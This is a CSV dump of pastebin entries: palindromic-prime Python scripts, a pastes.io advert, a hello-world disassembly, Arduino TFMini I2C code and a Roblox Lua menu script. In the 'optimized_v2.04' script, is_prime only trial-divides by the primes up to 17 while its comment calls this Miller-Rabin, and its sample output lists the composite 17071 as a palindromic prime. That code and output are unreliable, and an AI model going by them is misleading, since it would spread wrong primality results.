id,title,username,language,date,content
    """"""
    if num < 2:
        return False
    if num == 2 or num == 3:
        return True
    if num % 2 == 0 or num % 3 == 0:
        return False

    i = 5
    w = 2

    while i * i <= num:
        if num % i == 0:
            return False
        i += w
        w = 6 - w

    return True

def is_palindrome(num):
    """"""
    Checks if a given number is a palindrome.

    Args:
        num (int): The number to check for palindrome.

    Returns:
        bool: True if the number is a palindrome, False otherwise.
    """"""
    str_num = str(num)
    return str_num == str_num[::-1]

def generate_primes_and_palindromes(start_y, iterations):
    """"""
    Generates and identifies prime and palindromic prime numbers.

    Args:
        start_y (int): The starting value for 'y'.
        iterations (int): The number of iterations to check.

    Returns:
        list: A list of formatted strings representing the results.
    """"""
    results = []
    start_time = time.time()

    for y in range(start_y, start_y + iterations):
        P = y**2 - y + 41

        if is_prime(P) and is_palindrome(P):
            results.append(f""\033[31m[y={y}, pP={P}**]\033[0m"")
        elif is_prime(P):
            results.append(f""[y={y}, P={P}*]"")
        elif is_palindrome(P):
            results.append(f""\033[33m[y={y}, p={P}]\033[0m"")

    end_time = time.time()
    elapsed_time = end_time - start_time

    hours, remainder = divmod(elapsed_time, 3600)
    minutes, seconds = divmod(remainder, 60)

    results.append(f""\nProcessing time: {int(hours)} hours, {int(minutes)} minutes, {seconds:.6f} seconds"")

    return results

def main():
    """"""
    Main function to execute the script.
    Takes user input for 'y' and iterations, then outputs the results to the terminal.
    """"""
    start_y = int(input(""Enter the starting value for y: ""))
    iterations = int(input(""Enter the number of iterations: ""))
    data = generate_primes_and_palindromes(start_y, iterations)

    print(""\nResults:"")
    for result in data:
        print(result)

if __name__ == ""__main__"":
    main()

"
ZjKWuBPQ,Pastes.io - #1 Pastebin Alternative,xxsa,PHP,Monday 11th of March 2024 04:06:23 AM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Paste Folders
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Embed, download, print pastes
Clone pastes
Socialite (Facebook/Twitter/Google Social login)
Load files feature
Trending pastes page (day, week, month, year)
150+ different syntax languages
25+ Syntax Highlighting Skins for Ace Syntax Highlighter
Paste Folders
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Embed, download, print pastes
Report explicit pastes
Facebook/Disqus/Custom comment system
Invisible/Custom captcha protection
Load files feature
User profile page
Trending pastes page (day, week, month, year)
No Captcha for logged in users feature

Simple Ads by Google Adsense ( Few rather than Pastebin )"
SswUSh0u,hello.asm,genericPaster,ASM (NASM),Monday 11th of March 2024 04:05:39 AM CDT,"Disassembly of section .init:

0000000000001000 <_init>:
    1000:       f3 0f 1e fa             endbr64
    1004:       48 83 ec 08             sub    $0x8,%rsp
    1008:       48 8b 05 e1 2f 00 00    mov    0x2fe1(%rip),%rax        # 3ff0 <__gmon_start__@Base>
    100f:       48 85 c0                test   %rax,%rax
    1012:       74 02                   je     1016 <_init+0x16>
    1014:       ff d0                   call   *%rax
    1016:       48 83 c4 08             add    $0x8,%rsp
    101a:       c3                      ret

Disassembly of section .plt:

0000000000001020 <.plt>:
    1020:       ff 35 8a 2f 00 00       push   0x2f8a(%rip)        # 3fb0 <_GLOBAL_OFFSET_TABLE_+0x8>
    1026:       ff 25 8c 2f 00 00       jmp    *0x2f8c(%rip)        # 3fb8 <_GLOBAL_OFFSET_TABLE_+0x10>
    102c:       0f 1f 40 00             nopl   0x0(%rax)
    1030:       f3 0f 1e fa             endbr64
    1034:       68 00 00 00 00          push   $0x0
    1039:       e9 e2 ff ff ff          jmp    1020 <_init+0x20>
    103e:       66 90                   xchg   %ax,%ax
    1040:       f3 0f 1e fa             endbr64
    1044:       68 01 00 00 00          push   $0x1
    1049:       e9 d2 ff ff ff          jmp    1020 <_init+0x20>
    104e:       66 90                   xchg   %ax,%ax

Disassembly of section .plt.got:

0000000000001050 <__cxa_finalize@plt>:
    1050:       f3 0f 1e fa             endbr64
    1054:       ff 25 76 2f 00 00       jmp    *0x2f76(%rip)        # 3fd0 <__cxa_finalize@GLIBC_2.2.5>
    105a:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)

Disassembly of section .plt.sec:

0000000000001060 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>:
    1060:       f3 0f 1e fa             endbr64
    1064:       ff 25 56 2f 00 00       jmp    *0x2f56(%rip)        # 3fc0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@GLIBCXX_3.4>
    106a:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)

0000000000001070 <_ZNSolsEPFRSoS_E@plt>:
    1070:       f3 0f 1e fa             endbr64
    1074:       ff 25 4e 2f 00 00       jmp    *0x2f4e(%rip)        # 3fc8 <_ZNSolsEPFRSoS_E@GLIBCXX_3.4>
    107a:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)

Disassembly of section .text:

0000000000001080 <_start>:
    1080:       f3 0f 1e fa             endbr64
    1084:       31 ed                   xor    %ebp,%ebp
    1086:       49 89 d1                mov    %rdx,%r9
    1089:       5e                      pop    %rsi
    108a:       48 89 e2                mov    %rsp,%rdx
    108d:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
    1091:       50                      push   %rax
    1092:       54                      push   %rsp
    1093:       45 31 c0                xor    %r8d,%r8d
    1096:       31 c9                   xor    %ecx,%ecx
    1098:       48 8d 3d ca 00 00 00    lea    0xca(%rip),%rdi        # 1169 <main>
    109f:       ff 15 3b 2f 00 00       call   *0x2f3b(%rip)        # 3fe0 <__libc_start_main@GLIBC_2.34>
    10a5:       f4                      hlt
    10a6:       66 2e 0f 1f 84 00 00    cs nopw 0x0(%rax,%rax,1)
    10ad:       00 00 00

00000000000010b0 <deregister_tm_clones>:
    10b0:       48 8d 3d 59 2f 00 00    lea    0x2f59(%rip),%rdi        # 4010 <__TMC_END__>
    10b7:       48 8d 05 52 2f 00 00    lea    0x2f52(%rip),%rax        # 4010 <__TMC_END__>
    10be:       48 39 f8                cmp    %rdi,%rax
    10c1:       74 15                   je     10d8 <deregister_tm_clones+0x28>
    10c3:       48 8b 05 1e 2f 00 00    mov    0x2f1e(%rip),%rax        # 3fe8 <_ITM_deregisterTMCloneTable@Base>
    10ca:       48 85 c0                test   %rax,%rax
    10cd:       74 09                   je     10d8 <deregister_tm_clones+0x28>
    10cf:       ff e0                   jmp    *%rax
    10d1:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)
    10d8:       c3                      ret
    10d9:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)

00000000000010e0 <register_tm_clones>:
    10e0:       48 8d 3d 29 2f 00 00    lea    0x2f29(%rip),%rdi        # 4010 <__TMC_END__>
    10e7:       48 8d 35 22 2f 00 00    lea    0x2f22(%rip),%rsi        # 4010 <__TMC_END__>
    10ee:       48 29 fe                sub    %rdi,%rsi
    10f1:       48 89 f0                mov    %rsi,%rax
    10f4:       48 c1 ee 3f             shr    $0x3f,%rsi
    10f8:       48 c1 f8 03             sar    $0x3,%rax
    10fc:       48 01 c6                add    %rax,%rsi
    10ff:       48 d1 fe                sar    %rsi
    1102:       74 14                   je     1118 <register_tm_clones+0x38>
    1104:       48 8b 05 ed 2e 00 00    mov    0x2eed(%rip),%rax        # 3ff8 <_ITM_registerTMCloneTable@Base>
    110b:       48 85 c0                test   %rax,%rax
    110e:       74 08                   je     1118 <register_tm_clones+0x38>
    1110:       ff e0                   jmp    *%rax
    1112:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)
    1118:       c3                      ret
    1119:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)

0000000000001120 <__do_global_dtors_aux>:
    1120:       f3 0f 1e fa             endbr64
    1124:       80 3d 25 30 00 00 00    cmpb   $0x0,0x3025(%rip)        # 4150 <completed.0>
    112b:       75 2b                   jne    1158 <__do_global_dtors_aux+0x38>
    112d:       55                      push   %rbp
    112e:       48 83 3d 9a 2e 00 00    cmpq   $0x0,0x2e9a(%rip)        # 3fd0 <__cxa_finalize@GLIBC_2.2.5>
    1135:       00
    1136:       48 89 e5                mov    %rsp,%rbp
    1139:       74 0c                   je     1147 <__do_global_dtors_aux+0x27>
    113b:       48 8b 3d c6 2e 00 00    mov    0x2ec6(%rip),%rdi        # 4008 <__dso_handle>
    1142:       e8 09 ff ff ff          call   1050 <__cxa_finalize@plt>
    1147:       e8 64 ff ff ff          call   10b0 <deregister_tm_clones>
    114c:       c6 05 fd 2f 00 00 01    movb   $0x1,0x2ffd(%rip)        # 4150 <completed.0>
    1153:       5d                      pop    %rbp
    1154:       c3                      ret
    1155:       0f 1f 00                nopl   (%rax)
    1158:       c3                      ret
    1159:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)

0000000000001160 <frame_dummy>:
    1160:       f3 0f 1e fa             endbr64
    1164:       e9 77 ff ff ff          jmp    10e0 <register_tm_clones>

0000000000001169 <main>:
    1169:       f3 0f 1e fa             endbr64
    116d:       55                      push   %rbp
    116e:       48 89 e5                mov    %rsp,%rbp
    1171:       48 8d 05 8d 0e 00 00    lea    0xe8d(%rip),%rax        # 2005 <_ZStL19piecewise_construct+0x1>
    1178:       48 89 c6                mov    %rax,%rsi
    117b:       48 8d 05 be 2e 00 00    lea    0x2ebe(%rip),%rax        # 4040 <_ZSt4cout@GLIBCXX_3.4>
    1182:       48 89 c7                mov    %rax,%rdi
    1185:       e8 d6 fe ff ff          call   1060 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
    118a:       48 8b 15 47 2e 00 00    mov    0x2e47(%rip),%rdx        # 3fd8 <_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@GLIBCXX_3.4>
    1191:       48 89 d6                mov    %rdx,%rsi
    1194:       48 89 c7                mov    %rax,%rdi
    1197:       e8 d4 fe ff ff          call   1070 <_ZNSolsEPFRSoS_E@plt>
    119c:       b8 00 00 00 00          mov    $0x0,%eax
    11a1:       5d                      pop    %rbp
    11a2:       c3                      ret

Disassembly of section .fini:

00000000000011a4 <_fini>:
    11a4:       f3 0f 1e fa             endbr64
    11a8:       48 83 ec 08             sub    $0x8,%rsp
    11ac:       48 83 c4 08             add    $0x8,%rsp
    11b0:       c3                      ret"
HYPyB2k5,palindromic_primes_finder_optimized_v2.04,Python253,Python,Monday 11th of March 2024 03:27:28 AM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: palindromic_primes_finder_optimized_v2.04.py
# Version: 2.04
# Author: Jeoi Reqi

""""""
Palindromic Primes Finder:

This Python script focuses exclusively on identifying prime numbers that are palindromes, utilizing the equation [P = y^2 - y + 41], where 'y' is provided by the user.
The script iterates through a sequence of numbers, checking for palindromic primes, and displays the results.
Finally giving the user the processing time elapsed in the terminal. 

**Requirements:**
- Python 3

**Usage:**
1. Run the script in a terminal or command prompt.
2. Enter the starting value for 'y'.
3. Specify the number of iterations to check.
4. The script will output prime numbers that are also palindromes along with their corresponding 'y' values.
5. Outputs the elapsed time to process in the terminal.

**Note:**
- The equation used is [P = y^2 - y + 41].
- Only prime numbers that are palindromes will be displayed in the output.

Example:
Enter the starting value for y: 41
Enter the number of iterations: 10000000

Results:
[y=131, p=17071]
[y=1814, p=3288823]
[y=2738, p=7493947]
[y=17692, p=312989213]
[y=281233, p=79091719097]
[y=1372760, p=1884468644881]

Processing time: 164.902216 seconds
Processing time: 0 hours, 30 minutes, 18.918295 seconds
""""""

import random
import time

def is_prime(num, k=5):
    if num < 2:
        return False
    if num == 2 or num == 3:
        return True
    if num % 2 == 0 or num % 3 == 0:
        return False

    # Use a deterministic Miller-Rabin for smaller numbers
    if num < 1373653:
        return all(num % p != 0 for p in [2, 3, 5, 7, 11, 13, 17])

    s, d = 0, num - 1
    while d % 2 == 0:
        s += 1
        d //= 2

    for _ in range(k):
        a = random.randint(2, min(num - 2, 10**5))
        x = pow(a, d, num)
        if x == 1 or x == num - 1:
            continue

        for _ in range(s - 1):
            x = pow(x, 2, num)
            if x == num - 1:
                break
        else:
            return False

    return True

def is_palindrome(num):
    str_num = str(num)
    return str_num == str_num[::-1]

def generate_primes_and_palindromes(start_y, iterations):
    results = []
    start_time = time.time()

    for y in range(start_y, start_y + iterations):
        P = y**2 - y + 41

        if is_prime(P) and is_palindrome(P):
            results.append(f""[y={y}, p={P}]"")

    end_time = time.time()
    elapsed_time = end_time - start_time

    print(""\nResults:"")
    if not results:
        print(""No Palindromic Primes found."")
    else:
        for result in results:
            print(result)

    hours, remainder = divmod(elapsed_time, 3600)
    minutes, seconds = divmod(remainder, 60)
    print(f""\nProcessing time: {int(hours)} hours, {int(minutes)} minutes, {seconds:.6f} seconds\n"")


if __name__ == ""__main__"":
    start_y = int(input(""Enter the starting value for y: ""))
    iterations = int(input(""Enter the number of iterations: ""))
    generate_primes_and_palindromes(start_y, iterations)

"
qraqELx0,TFMini I2C,microrobotics,Arduino,Monday 11th of March 2024 02:59:34 AM CDT,"#include <Arduino.h>
#include <Wire.h>

const uint8_t SENSOR_ADDRESS = 0x10; // TFMini I2C Address
const uint8_t DISTANCE_DATA_LENGTH = 7; // Data length for distance data request
const uint8_t MAX_RETRY_COUNT = 3; // Maximum number of retries for reading data
const uint16_t UNRELIABLE_DATA = 0xFFFF; // Indicating unreliable data

struct SensorData {
  uint16_t distance;  // Measured distance
  uint16_t strength;  // Signal strength
  uint8_t rangeType;  // Range scale: 0 (short), 3 (intermediate), 7 (long)
  bool isValid;       // Flag to indicate if the data is valid
};

unsigned long readFrequencyMillis = 50; // Default read frequency: 50 ms

void setup() {
  Wire.begin();
  Serial.begin(115200);
  Serial.println(""TFMini I2C Test"");
}

void loop() {
  static unsigned long lastReadTime = 0; // Tracks the last read time
  unsigned long currentTime = millis(); // Current time

  if (currentTime - lastReadTime >= readFrequencyMillis) {
    SensorData data = tryReadSensorData(SENSOR_ADDRESS, MAX_RETRY_COUNT);

    if (data.isValid && data.distance != UNRELIABLE_DATA) {
      Serial.print(""\tDist["");
      Serial.print(data.distance);
      Serial.print(""]\tStrength["");
      Serial.print(data.strength);
      Serial.print(""]\tMode["");
      Serial.print(data.rangeType);
      Serial.println(""]"");
    }

    lastReadTime = currentTime; // Update the last read time
  }
}

void setReadFrequency(unsigned long frequencyMillis) {
  readFrequencyMillis = frequencyMillis;
}

SensorData tryReadSensorData(uint8_t deviceAddress, uint8_t retries) {
  while (retries--) {
    SensorData data = readSensorData(deviceAddress);
    if (data.isValid) {
      return data; // Valid data received
    }
    delay(10); // Wait a bit before retrying
  }
  return SensorData{0, 0, 0, false}; // Return invalid data after exhausting retries
}

SensorData readSensorData(uint8_t deviceAddress) {
  SensorData data = {0, 0, 0, false};

  Wire.beginTransmission(deviceAddress);
  Wire.write(0x01); // MSB
  Wire.write(0x02); // LSB
  Wire.write(DISTANCE_DATA_LENGTH); // Request distance data
  if (Wire.endTransmission(false) != 0) {
    return data; // Sensor did not acknowledge
  }

  Wire.requestFrom(deviceAddress, DISTANCE_DATA_LENGTH);
  if (Wire.available() < DISTANCE_DATA_LENGTH) {
    return data; // Not enough data available
  }

  for (uint8_t i = 0; i < DISTANCE_DATA_LENGTH; i++) {
    uint8_t incoming = Wire.read();
    switch (i) {
      case 0:
        data.isValid = (incoming == 0x01);
        break;
      case 2:
        data.distance = incoming; // LSB of the distance
        break;
      case 3:
        data.distance |= incoming << 8; // MSB of the distance
        if (data.distance == UNRELIABLE_DATA) {
          data.isValid = false;
        }
        break;
      case 4:
        data.strength = incoming; // LSB of signal strength
        break;
      case 5:
        data.strength |= incoming << 8; // MSB of signal strength
        break;
      case 6:
        data.rangeType = incoming; // Range scale
        break;
    }
  }
  return data;
}
"
BvmsrJHb,TheRealGalavant - CategorySwitch Custom System,FrenchFrazier,Lua,Monday 11th of March 2024 02:40:23 AM CDT,"This is the Category UI Switch for the game I am sending into Hidden Developers Application. I made a complex customization system where players click on Customization tab and can switch between the tabs and rotate the viewportframe 3d model, etc. Its still in the works, so this code doesn't really apply to anyone else using it as this is just part of the whole thing for an application. My name is TheRealGalavant, but my name is FrenchFrazier on here.


CatergorySwitch System:

-- Get references to UI elements
local CategoriesFrame = script.Parent
local CustomizationFrame = script.Parent.Parent

local CharacterFrame = CustomizationFrame:WaitForChild(""character"")
local ArmorFrame = CustomizationFrame:WaitForChild(""armor"")
local LoadoutFrame = CustomizationFrame:WaitForChild(""gunloadout"")

local CharacterButton = CategoriesFrame:WaitForChild(""char"")
local ArmorButton = CategoriesFrame:WaitForChild(""armor"")
local LoadoutButton = CategoriesFrame:WaitForChild(""loadout"")

-- Define the morph frames you want to control
local morphFrames = {
	[""501stSelectMorph""] = false,
	[""TGRSelectMorph""] = false,
	[""212thSelectMorph""] = false,
	[""187thSelectMorph""] = false,
	[""ARCSelectMorph""] = false,
	[""RCSelectMorph""] = false,
	[""CGSelectMorph""] = false,
	[""RGSelectMorph""] = false,
	[""TJOSelectMorph""] = false
}

-- Function to show a specific UI frame and hide others
local function ShowUIFrame(uiFrame)
	for _, frame in ipairs(CustomizationFrame:GetChildren()) do
		if frame:IsA(""Frame"") then
			frame.Visible = (frame == uiFrame)
		end
	end
end

-- Function to set text color and background transparency for category buttons
local function SetButtonStyle(clickedButton)
	for _, button in ipairs(CategoriesFrame:GetChildren()) do
		if button:IsA(""TextButton"") then
			button.TextColor3 = (button == clickedButton and Color3.new(0, 0, 0) or Color3.new(115/255, 135/255, 160/255))
			button.BackgroundTransparency = (button == clickedButton and 0 or 1)
		end
	end
end

-- Function to show or hide the ViewportFrame within Customized Morph ScreenGui
local function ToggleCustomizedMorphViewportFrameVisibility(visible)
	local customizedMorphScreenGui = CharacterFrame:FindFirstChild(""Customized Morph"")
	if customizedMorphScreenGui then
		local viewportFrame = customizedMorphScreenGui:FindFirstChild(""ViewportFrame"")
		if viewportFrame then
			viewportFrame.Visible = visible
		end
	end
end

-- Function to show 501stSelectMorph frame when 501stDiv button is clicked
local function Show501stSelectMorphFrame()
	local armorFrame = CustomizationFrame:FindFirstChild(""armor"")
	if armorFrame then
		local divisionSelector = armorFrame:FindFirstChild(""DivisionSelector"")
		if divisionSelector then
			local scrollingFrame = divisionSelector:FindFirstChild(""ScrollingFrame"")
			if scrollingFrame then
				local divisionframe = scrollingFrame:FindFirstChild(""501stDiv"")
				if divisionframe then
					local divButton = divisionframe:FindFirstChild(""TextButton"")
					if divButton and divButton:IsA(""TextButton"") then
						divButton.MouseButton1Click:Connect(function()
							local selectMorphFrame = armorFrame:FindFirstChild(""501stSelectMorph"")
							if selectMorphFrame then
								selectMorphFrame.Visible = true
							end
						end)
					end
				end
			end
		end
	end
end

-- Function to show TGRSelectMorph frame when 501stDiv button is clicked
local function ShowTGRSelectMorphFrame()
	local armorFrame = CustomizationFrame:FindFirstChild(""armor"")
	if armorFrame then
		local divisionSelector = armorFrame:FindFirstChild(""DivisionSelector"")
		if divisionSelector then
			local scrollingFrame = divisionSelector:FindFirstChild(""ScrollingFrame"")
			if scrollingFrame then
				local divisionframe = scrollingFrame:FindFirstChild(""GalacticRepublicDiv"")
				if divisionframe then
					local divButton = divisionframe:FindFirstChild(""TextButton"")
					if divButton and divButton:IsA(""TextButton"") then
						divButton.MouseButton1Click:Connect(function()
							local selectMorphFrame = armorFrame:FindFirstChild(""TGRSelectMorph"")
							if selectMorphFrame then
								selectMorphFrame.Visible = true
							end
						end)
					end
				end
			end
		end
	end
end

-- Function to show 212thSelectMorph frame when 501stDiv button is clicked
local function Show212thSelectMorphFrame()
	local armorFrame = CustomizationFrame:FindFirstChild(""armor"")
	if armorFrame then
		local divisionSelector = armorFrame:FindFirstChild(""DivisionSelector"")
		if divisionSelector then
			local scrollingFrame = divisionSelector:FindFirstChild(""ScrollingFrame"")
			if scrollingFrame then
				local divisionframe = scrollingFrame:FindFirstChild(""212thDiv"")
				if divisionframe then
					local divButton = divisionframe:FindFirstChild(""TextButton"")
					if divButton and divButton:IsA(""TextButton"") then
						divButton.MouseButton1Click:Connect(function()
							local selectMorphFrame = armorFrame:FindFirstChild(""212thSelectMorph"")
							if selectMorphFrame then
								selectMorphFrame.Visible = true
							end
						end)
					end
				end
			end
		end
	end
end

-- Function to show 187thSelectMorph frame when 501stDiv button is clicked
local function Show187thSelectMorphFrame()
	local armorFrame = CustomizationFrame:FindFirstChild(""armor"")
	if armorFrame then
		local divisionSelector = armorFrame:FindFirstChild(""DivisionSelector"")
		if divisionSelector then
			local scrollingFrame = divisionSelector:FindFirstChild(""ScrollingFrame"")
			if scrollingFrame then
				local divisionframe = scrollingFrame:FindFirstChild(""187thDiv"")
				if divisionframe then
					local divButton = divisionframe:FindFirstChild(""TextButton"")
					if divButton and divButton:IsA(""TextButton"") then
						divButton.MouseButton1Click:Connect(function()
							local selectMorphFrame = armorFrame:FindFirstChild(""187thSelectMorph"")
							if selectMorphFrame then
								selectMorphFrame.Visible = true
							end
						end)
					end
				end
			end
		end
	end
end

-- Function to show ARCSelectMorph frame when 501stDiv button is clicked
local function ShowARCSelectMorphFrame()
	local armorFrame = CustomizationFrame:FindFirstChild(""armor"")
	if armorFrame then
		local divisionSelector = armorFrame:FindFirstChild(""DivisionSelector"")
		if divisionSelector then
			local scrollingFrame = divisionSelector:FindFirstChild(""ScrollingFrame"")
			if scrollingFrame then
				local divisionframe = scrollingFrame:FindFirstChild(""ARCDiv"")
				if divisionframe then
					local divButton = divisionframe:FindFirstChild(""TextButton"")
					if divButton and divButton:IsA(""TextButton"") then
						divButton.MouseButton1Click:Connect(function()
							local selectMorphFrame = armorFrame:FindFirstChild(""ARCSelectMorph"")
							if selectMorphFrame then
								selectMorphFrame.Visible = true
							end
						end)
					end
				end
			end
		end
	end
end

-- Function to show ARCSelectMorph frame when 501stDiv button is clicked
local function ShowRCSelectMorphFrame()
	local armorFrame = CustomizationFrame:FindFirstChild(""armor"")
	if armorFrame then
		local divisionSelector = armorFrame:FindFirstChild(""DivisionSelector"")
		if divisionSelector then
			local scrollingFrame = divisionSelector:FindFirstChild(""ScrollingFrame"")
			if scrollingFrame then
				local divisionframe = scrollingFrame:FindFirstChild(""RCDiv"")
				if divisionframe then
					local divButton = divisionframe:FindFirstChild(""TextButton"")
					if divButton and divButton:IsA(""TextButton"") then
						divButton.MouseButton1Click:Connect(function()
							local selectMorphFrame = armorFrame:FindFirstChild(""RCSelectMorph"")
							if selectMorphFrame then
								selectMorphFrame.Visible = true
							end
						end)
					end
				end
			end
		end
	end
end

-- Function to show ARCSelectMorph frame when 501stDiv button is clicked
local function ShowCGSelectMorphFrame()
	local armorFrame = CustomizationFrame:FindFirstChild(""armor"")
	if armorFrame then
		local divisionSelector = armorFrame:FindFirstChild(""DivisionSelector"")
		if divisionSelector then
			local scrollingFrame = divisionSelector:FindFirstChild(""ScrollingFrame"")
			if scrollingFrame then
				local divisionframe = scrollingFrame:FindFirstChild(""CGDiv"")
				if divisionframe then
					local divButton = divisionframe:FindFirstChild(""TextButton"")
					if divButton and divButton:IsA(""TextButton"") then
						divButton.MouseButton1Click:Connect(function()
							local selectMorphFrame = armorFrame:FindFirstChild(""CGSelectMorph"")
							if selectMorphFrame then
								selectMorphFrame.Visible = true
							end
						end)
					end
				end
			end
		end
	end
end

-- Function to show ARCSelectMorph frame when 501stDiv button is clicked
local function ShowRGSelectMorphFrame()
	local armorFrame = CustomizationFrame:FindFirstChild(""armor"")
	if armorFrame then
		local divisionSelector = armorFrame:FindFirstChild(""DivisionSelector"")
		if divisionSelector then
			local scrollingFrame = divisionSelector:FindFirstChild(""ScrollingFrame"")
			if scrollingFrame then
				local divisionframe = scrollingFrame:FindFirstChild(""RGDiv"")
				if divisionframe then
					local divButton = divisionframe:FindFirstChild(""TextButton"")
					if divButton and divButton:IsA(""TextButton"") then
						divButton.MouseButton1Click:Connect(function()
							local selectMorphFrame = armorFrame:FindFirstChild(""RGSelectMorph"")
							if selectMorphFrame then
								selectMorphFrame.Visible = true
							end
						end)
					end
				end
			end
		end
	end
end

-- Function to show ARCSelectMorph frame when 501stDiv button is clicked
local function ShowTJOSelectMorphFrame()
	local armorFrame = CustomizationFrame:FindFirstChild(""armor"")
	if armorFrame then
		local divisionSelector = armorFrame:FindFirstChild(""DivisionSelector"")
		if divisionSelector then
			local scrollingFrame = divisionSelector:FindFirstChild(""ScrollingFrame"")
			if scrollingFrame then
				local divisionframe = scrollingFrame:FindFirstChild(""TJODiv"")
				if divisionframe then
					local divButton = divisionframe:FindFirstChild(""TextButton"")
					if divButton and divButton:IsA(""TextButton"") then
						divButton.MouseButton1Click:Connect(function()
							local selectMorphFrame = armorFrame:FindFirstChild(""TJOSelectMorph"")
							if selectMorphFrame then
								selectMorphFrame.Visible = true
							end
						end)
					end
				end
			end
		end
	end
end

-- Function to hide all morph frames
local function HideAllMorphFrames()
	for name, visible in pairs(morphFrames) do
		local frame = ArmorFrame:FindFirstChild(name)
		if frame then
			frame.Visible = false
		end
	end
end

-- Function to show a specific morph frame
local function ShowMorphFrame(frameName)
	HideAllMorphFrames()
	local frame = ArmorFrame:FindFirstChild(frameName)
	if frame then
		frame.Visible = true
	end
end

-- Connect click events for category buttons
CharacterButton.MouseButton1Click:Connect(function()
	ShowUIFrame(CharacterFrame)
	SetButtonStyle(CharacterButton)
	CategoriesFrame.Visible = true
	ToggleCustomizedMorphViewportFrameVisibility(true) -- Show ViewportFrame
end)

ArmorButton.MouseButton1Click:Connect(function()
	ShowUIFrame(ArmorFrame)
	SetButtonStyle(ArmorButton)
	CategoriesFrame.Visible = true
	ToggleCustomizedMorphViewportFrameVisibility(false) -- Hide ViewportFrame
end)

LoadoutButton.MouseButton1Click:Connect(function()
	ShowUIFrame(LoadoutFrame)
	SetButtonStyle(LoadoutButton)
	CategoriesFrame.Visible = true
	ToggleCustomizedMorphViewportFrameVisibility(false) -- Hide ViewportFrame
end)

-- Function to connect click events for divisional buttons
local function ConnectDivisionButtonClick(divisionName, frameName)
	local divisionFrame = ArmorFrame:FindFirstChild(""DivisionSelector""):FindFirstChild(""ScrollingFrame""):FindFirstChild(divisionName)
	if divisionFrame then
		local button = divisionFrame:FindFirstChild(""TextButton"")
		if button then
			button.MouseButton1Click:Connect(function()
				ShowMorphFrame(frameName)
			end)
		else
			warn(""TextButton not found in division frame "" .. divisionName)
		end
	else
		warn(""Division frame "" .. divisionName .. "" not found"")
	end
end

-- Connect click events for divisional buttons
ConnectDivisionButtonClick(""501stDiv"", ""501stSelectMorph"")
ConnectDivisionButtonClick(""GalacticRepublicDiv"", ""TGRSelectMorph"")
ConnectDivisionButtonClick(""212thDiv"", ""212thSelectMorph"")
ConnectDivisionButtonClick(""187thDiv"", ""187thSelectMorph"")
ConnectDivisionButtonClick(""ARCDiv"", ""ARCSelectMorph"")
ConnectDivisionButtonClick(""RCDiv"", ""RCSelectMorph"")
ConnectDivisionButtonClick(""CGDiv"", ""CGSelectMorph"")
ConnectDivisionButtonClick(""RGDiv"", ""RGSelectMorph"")
ConnectDivisionButtonClick(""TJODiv"", ""TJOSelectMorph"")


-- Initially set the text color and transparency for the character button
SetButtonStyle(CharacterButton)"
